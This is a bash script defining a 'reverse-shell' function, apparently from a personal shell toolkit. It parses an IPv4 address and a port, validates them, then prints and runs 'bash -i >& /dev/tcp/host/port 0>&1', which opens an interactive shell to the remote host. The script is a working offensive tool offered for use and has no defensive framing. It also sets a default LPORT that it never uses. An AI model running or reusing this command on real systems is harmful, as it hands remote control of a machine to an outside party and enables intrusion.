#!/bin/bash

## Create a reverse shell connection
function reverse-shell() {
    function _usage() {
        _echo_success 'usage:' "$1" "$2"; _echo_primary 'netcat-reverse-shell [ip] -p [port] -h (help)\n'
    }

    #--------------------------------------------------
    # Variables
    #--------------------------------------------------

    local rhost
    local rport

    #--------------------------------------------------
    # Parse arguments
    #--------------------------------------------------

    local arguments=()
    local OPTARG
    local option
    while [ "$#" -gt 0 ]; do
        OPTIND=0
        while getopts :p:h option; do
            case "${option}" in
                p) rport="${OPTARG}";;
                h) _echo_warning 'reverse-shell\n';
                    _echo_success 'description:' 2 14; _echo_primary 'Create a reverse shell connection\n'
                    _usage 2 14
                    return 0;;
                :) _echo_danger "error: \"${OPTARG}\" requires value\n"
                    return 1;;
                \?) _echo_danger "error: invalid option \"${OPTARG}\"\n"
                    return 1;;
            esac
        done
        if [ "${OPTIND}" -gt 1 ]; then
            shift $(( OPTIND-1 ))
        fi
        if [ "${OPTIND}" -eq 1 ]; then
            arguments+=("$1")
            shift
        fi
    done

    #--------------------------------------------------
    # Validate argument count
    #--------------------------------------------------

    if [ -z "${arguments[${LBOUND}]}" ]; then
        _echo_danger 'error: some mandatory parameter is missing\n'
        _usage 2 8
        return 1
    fi

    if [ "${#arguments[@]}" -gt 1 ]; then
        _echo_danger "error: too many arguments (${#arguments[@]})\n"
        _usage 2 8
        return 1
    fi

    #--------------------------------------------------
    # Get argument
    #--------------------------------------------------

    rhost=${arguments[${LBOUND}]}

    #--------------------------------------------------

    if [ -z "${LPORT}" ]; then
        LPORT=8080
    fi

    # check ip valid, host should be an ipv4
    if [[ ! "${rhost}" =~ ^([0-9]{0,3}\.){3}[0-9]{0,3}$ ]]; then
        _echo_danger 'error: host should be an ipv4 address\n'
        _usage 2 8
        return 1
    fi

    # port should be a positive integer
    if [[ ! "${rport}" =~ ^[0-9]+$ ]]; then
        _echo_danger 'error: port should be a positive integer\n'
        _usage 2 8
        return 1
    fi

    _echo_info "bash -i >& \"/dev/tcp/${rhost}/${rport}\" 0>&1\n"
    bash -i >& "/dev/tcp/${rhost}/${rport}" 0>&1
}
